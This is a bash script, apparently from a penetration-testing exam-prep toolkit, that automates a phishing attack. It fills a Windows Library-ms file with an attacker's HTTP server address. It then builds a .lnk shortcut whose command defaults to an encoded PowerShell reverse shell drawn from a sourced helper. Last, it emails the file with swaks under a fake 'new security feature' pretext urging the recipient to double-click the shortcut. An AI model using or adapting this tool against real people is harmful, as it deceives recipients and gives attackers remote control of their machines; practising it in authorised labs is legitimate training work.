#!/bin/bash
SCRIPTDIR=$(dirname "${BASH_SOURCE[0]}")
source $SCRIPTDIR/network.sh
source $SCRIPTDIR/reverse_shell.sh
source $SCRIPTDIR/.env

get_config_library() {
    if [[ -z "$http_ip" ]]; then
        echo "Please set the http ip first"
        return 1
    fi
    local config_file="config.Library-ms"
    cp $SCRIPTDIR/../xml/$config_file .
    sed -E -i 's/\{http_ip\}/'$http_ip'/g' $config_file
    sed -E -i 's/\{http_port\}/'$http_port'/g' $config_file
}

generate_windows_shortcut() {
    if [[ -z "$cmd" ]]; then
        cmd=$(get_powershell_interactive_shell)
    else
        echo "Using cmd=$cmd"
    fi
    local shortcut_name=$1
    if [[ -z "$shortcut_name" ]]; then
        shortcut_name="automatic_configuration.lnk"
    fi
    cp $SCRIPTDIR/../ps1/windows_shortcut.ps1 .
    sed -E -i 's/\{cmd\}/'"$cmd"'/g' windows_shortcut.ps1
    sed -E -i 's/\{shortcut_name\}/'$shortcut_name'/g' windows_shortcut.ps1
    local run_shortcut=$(cat windows_shortcut.ps1)
    run_shortcut=$(encode_powershell "$run_shortcut")
    #echo $run_shortcut
    ssh $windows_username@$windows_computername "$run_shortcut"
    if [[ ! -d "shortcuts" ]]; then
        mkdir shortcuts
    fi
    scp $windows_username@$windows_computername:c:/users/$windows_username/$shortcut_name shortcuts
    cp shortcuts/$shortcut_name . # offsec might expect it in this location rather than looking at the actual URL
}

send_phishing_email() {

    get_config_library
    generate_windows_shortcut
    if [[ ! -f body.txt ]]; then
        echo "Email body file not found. Creating a new one."
        echo "Hey!" > body.txt
        echo "Please install the new security feature for your workstation" >> body.txt
        echo "For this, download the attachment file, double-click on it, and execute the configuration shortcut within. Thanks!" >> body.txt
    fi
    if [[ -z "$target_email" ]]; then
        echo "Target email is not set. Please set it before sending the email."
        return 1
    fi
    if [[ -z "$sender_email" ]]; then
        echo "Sender email is not set. Please set it before sending the email."
        return 1
    fi
    if [[ -z "$smtp_server" ]]; then
        echo "SMTP server is not set. Please set it before sending the email."
        return 1
    fi
    if [[ -z "$smtp_username" ]]; then
        echo "SMTP username is not set. Please set it before sending the email."
        return 1
    fi
    if [[ -z "$smtp_password" ]]; then
        echo "SMTP password is not set. Please set it before sending the email."
        return 1
    fi
    swaks -t $target_email --from $sender_email --attach @config.Library-ms --header "Subject: Staging Script" --body @body.txt --server $smtp_server --auth LOGIN --auth-user $smtp_username --auth-password $smtp_password
}

if [[ "${BASH_SOURCE[0]}" == "$0" ]]; then
    if [[ -z "$windows_username" ]] || [[ -z "$windows_computername" ]]; then
        echo "Windows username and computer name must be set before running this script."
        exit 1
    fi
    if [[ "$1" == "get_config_library" ]]; then
        host_ip=127.0.0.1
        get_config_library
        exit 0
    elif [[ "$1" == "generate_windows_shortcut" ]]; then
        host_ip=127.0.0.1
        http_ip=127.0.0.1
        generate_windows_shortcut "$2"
        exit 0
    fi
    echo "Usage: $0 {get_config_library|generate_windows_shortcut [shortcut_name]}"
fi